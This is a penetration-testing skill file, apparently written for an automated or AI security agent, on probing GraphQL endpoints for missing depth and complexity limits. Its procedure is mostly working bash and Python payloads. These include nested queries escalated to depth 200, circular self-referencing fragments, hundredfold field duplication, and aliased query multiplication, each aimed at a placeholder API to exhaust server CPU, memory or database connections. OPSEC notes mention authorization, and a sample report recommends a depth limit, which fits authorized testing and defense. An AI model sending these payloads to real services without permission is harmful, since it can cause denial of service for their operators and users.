---
name: graphql-depth
description: Test GraphQL depth limits, recursive queries, and complexity analysis
version: 1.0.0
phase: recon
category: api
tags: [graphql, api, depth, recursion, complexity]
tools: [curl, python3]
difficulty: advanced
opsec_level: low
time_estimate: 30s
severity_if_found: high
related_skills:
  - graphql-batching
  - hidden-endpoints
mitre_attack:
  - T1595.004
  - T1530
---

## When to Use

Use this skill to test GraphQL endpoints for improper depth limiting and recursive
query vulnerabilities. An endpoint without depth limits can be abused for DoS via
deeply nested or circular queries, causing the server to exhaust CPU, memory, or
database connections.

## Prerequisites

- curl
- python3
- Target GraphQL endpoint detected

## Procedure

```bash
TARGET="https://api.target.com/graphql"
AUTH="Authorization: Bearer <token>"

# 1. Depth escalation — progressively deepen the query
echo '=== Depth Escalation ==='
for depth in 3 5 10 20 50 100 200; do
    # Build a deeply nested query using aliases
    query="query { users(first:1) { id name"
    for ((i=1; i<=depth; i++)); do
        query+=" posts { id title comments { id body author { id name"
    done
    query+=$(printf ' }%.0s' $(seq 1 $((depth*3))))
    query+=" } }"

    start_time=$(date +%s%N)
    result=$(curl -sk -o /dev/null -w "%{http_code}|%{time_total}" \
                  "$TARGET" \
                  -H "Content-Type: application/json" \
                  -H "$AUTH" \
                  -d "{\"query\":\"$query\"}" 2>/dev/null)
    elapsed=$(( ($(date +%s%N) - start_time) / 1000000 ))
    echo "Depth ${depth}: $result | ${elapsed}ms"
done

# 2. Circular query detection — mutually recursive fields
echo '=== Circular / Mutually Recursive Queries ==='

# Users → Posts → User → Posts → ...
curl -sk "$TARGET" \
     -H "Content-Type: application/json" \
     -H "$AUTH" \
     -d '{"query":"query Circular {
       u1: user(id:1) {
         name
         posts { title author { name posts { title author { name } } } }
       }
     }"}' | python3 -m json.tool 2>/dev/null

# Fragments that call themselves
curl -sk "$TARGET" \
     -H "Content-Type: application/json" \
     -H "$AUTH" \
     -d '{"query":"fragment selfRef on User { name posts { author { ...selfRef } } } query { user(id:1) { ...selfRef } }"}' \
     | python3 -m json.tool 2>/dev/null

# 3. Field duplication — same field requested many times
echo '=== Field Duplication ==='
dup_query="query { user(id:1) { $(printf 'name '%.0s $(seq 1 100)) $(printf 'email '%.0s $(seq 1 100)) } }"
curl -sk -o /dev/null -w "100× name+email: %{http_code} | %{time_total}s\n" \
     "$TARGET" -H "Content-Type: application/json" -H "$AUTH" \
     -d "{\"query\":\"$dup_query\"}"

# 4. Complexity analysis — estimate cost per query
echo '=== Complexity Analysis ==='
python3 -c "
import requests, json, sys

url = '$TARGET'
headers = {'Content-Type': 'application/json', '$AUTH'}

# Introspect for cost/complexity info
intro_query = '''
query {
  __schema {
    queryType { fields { name args { name } } }
    mutationType { fields { name } }
  }
}
'''
for query_name in ['users', 'posts', 'user', 'post', 'searchProducts']:
    payload = {'query': f'query {{ {query_name}(first: 1000) {{ __typename }} }}'}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=15)
        elapsed = r.elapsed.total_seconds()
        size = len(r.text)
        print(f'{query_name}: {elapsed:.3f}s | {size} bytes response')
    except Exception as e:
        print(f'{query_name}: ERROR — {e}')
"

# 5. Aliased depth explosion — multiply same deep query via aliases
echo '=== Aliased Depth Explosion ==='
python3 -c "
import requests, json

url = '$TARGET'
headers = {'Content-Type': 'application/json', '$AUTH'}
base = 'user(id:1) { name email posts { title } }'
aliases = {f'a{i}': base for i in range(20)}
payload = {'query': f'query Depth {{ ' + ' '.join(f'{k}: {v}' for k,v in aliases.items()) + ' }'}
r = requests.post(url, json=payload, headers=headers, timeout=30)
print(f'{len(aliases)} aliased queries: {r.status_code} | {len(r.text)} bytes in {r.elapsed.total_seconds():.3f}s')
"
```

## OPSEC Rules

- Start with depth 3 and escalate slowly — stop if response times exceed 5s
- Do NOT send depth > 200 on production targets without authorization
- Circular query tests are single-request — these are the riskiest payloads
- Limit aliased depth test to 20 aliases to avoid accidental DoS
- Cold-start the GraphQL engine with an introspection query before depth testing

## Verification

- Check for explicit depth-limit errors (e.g., `"max depth exceeded"`) vs. timeout-based termination
- Verify circular queries return errors (fragment cycle detected) vs. infinite loop
- Confirm field duplication does not cause memory exhaustion
- Cross-reference response times with and without depth limits to determine threshold
- Check if depth limit is global or per-field

## Pitfalls

- GraphQL frameworks may silently truncate deep responses without notifying the client
- Depth limiting may be enforced at the API gateway, not the GraphQL engine
- Some resolvers use DataLoader and don't actually load duplicate data — field duplication may be safe
- Circular fragment detection varies by framework (Apollo vs. graphql-ruby vs. Juniper)
- Connection types (edges/node/pageInfo) naturally add depth to queries
- Response times may be network- or DB-bound, not GraphQL depth-bound

## Output Format

```
[DEPTH LIMIT] Threshold found at depth 50
  Endpoint: https://api.target.com/graphql
  Depth 20: 200 — 0.3s (normal)
  Depth 50: 200 — 1.2s (slow but returns)
  Depth 100: 200 — 8.4s (extreme degradation)
  Depth 200: timeout after 30s
  Recommended depth limit: 20

[CIRCULAR QUERY] Fragment self-reference detected — error returned
  Error: "Cannot spread fragment 'selfRef' within itself"
  Status: Protected — circular queries rejected

[FIELD DUPLICATION] 100× name+email — 200 OK
  No denial-of-service — response identical to single query (DataLoader caching)
```
